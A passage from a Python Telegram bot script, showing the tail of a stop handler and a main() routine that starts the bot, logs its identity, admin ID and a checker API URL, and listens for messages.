            await event.edit(premium_emoji("🛑 Stopping... report will be sent shortly."), parse_mode='html')
        except:
            pass

# ========== Main ==========
async def main():
    try:
        logger.info("🚀 Starting bot...")
        await load_maintenance()
        await bot.start(bot_token=BOT_TOKEN)
        me = await bot.get_me()
        logger.info(f"✅ Bot started as @{me.username} (ID: {me.id})")
        logger.info(f"👑 Admins: {ADMIN_ID}")
        logger.info(f"🌐 API: {CHECKER_API_URL}")
        logger.info("🤖 Bot is now listening for messages...")
        await bot.run_until_disconnected()
    except Exception as e:
        logger.error(f"❌ Bot crashed: {e}", exc_info=True)
        raise

if __name__ == "__main__":
    asyncio.run(main())
